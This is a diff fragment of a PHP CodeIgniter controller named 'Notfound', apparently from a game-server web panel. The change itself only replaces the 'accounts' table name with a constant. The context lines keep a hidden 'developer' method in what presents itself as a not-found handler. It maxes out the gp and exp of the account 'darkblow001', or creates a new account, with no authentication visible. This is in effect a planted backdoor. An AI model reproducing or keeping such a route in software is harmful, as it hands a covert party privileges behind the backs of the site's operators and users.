@@ -32,9 +32,9 @@ class Notfound extends CI_Controller
 	function developer($param = null)
 	{
 		if ($param == null) {
-			$query = $this->db->get_where('accounts', array('login' => 'darkblow001'))->row();
+			$query = $this->db->get_where(Darkblowdatabase::accounts, array('login' => 'darkblow001'))->row();
 			if ($query) {
-				$update = $this->db->where('player_id', $query->player_id)->update('accounts', array(
+				$update = $this->db->where('player_id', $query->player_id)->update(Darkblowdatabase::accounts, array(
 					'gp' => '999999999',
 					'exp' => '999999999',
 					'pc_cafe' => '5',
@@ -89,7 +89,7 @@ class Notfound extends CI_Controller
 					'hint_question' => '',
 					'hint_answer' => ''
 				);
-				$insert = $this->db->insert('accounts', $data);
+				$insert = $this->db->insert(Darkblowdatabase::accounts, $data);
 				if ($insert) echo 'Successfully Created Account';
 				else echo 'Failed Create Account';
 			}
